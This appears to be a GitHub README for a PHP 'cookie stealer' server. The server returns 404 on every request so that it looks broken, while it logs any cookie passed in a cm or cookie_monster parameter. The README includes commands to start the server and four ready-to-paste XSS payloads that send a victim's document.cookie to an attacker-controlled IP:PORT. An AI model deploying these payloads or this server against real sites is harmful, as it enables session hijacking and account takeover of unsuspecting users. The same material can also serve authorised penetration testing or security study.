# Cookie Monster 

## Description

Simple php self server for capturing cookies. (also to help learn some PHP)

Gives 404 on all requests to seem broken.  
Will log any request with either ```cm``` or ```cookie_monster``` as the parameter.

eg: 

```
http://IP:PORT/?cm=cookieToSteal
```

## Usage

Save the index.php file to a directory.
Open a shell in that directory. 
Start a PHP server

Windows 

```
C:\php\php.exe -S 0.0.0.0:3000
```

Linux

```
php -S 0.0.0.0:3000
```

Basic XSS Cookie stealer payloads

```
<script>var i = new Image();i.src="http://IP:PORT/cm="+document.cookie</script>
"><script>var i = new Image();i.src="http://IP:PORT/cm="+document.cookie</script>


<script>var i = new Image();i.src="http://IP:PORT/cookie_monster="+document.cookie</script>
"><script>var i = new Image();i.src="http://IP:PORT/cookie_monster="+document.cookie</script>
```



Screenshots.

Windows

![image](https://user-images.githubusercontent.com/5285547/132856213-6e5abeb2-94fe-43a6-b24f-149868a83ab7.png)

Linux

![image](https://user-images.githubusercontent.com/5285547/132856713-36b21833-549f-47f0-a76c-11742973f1c0.png)

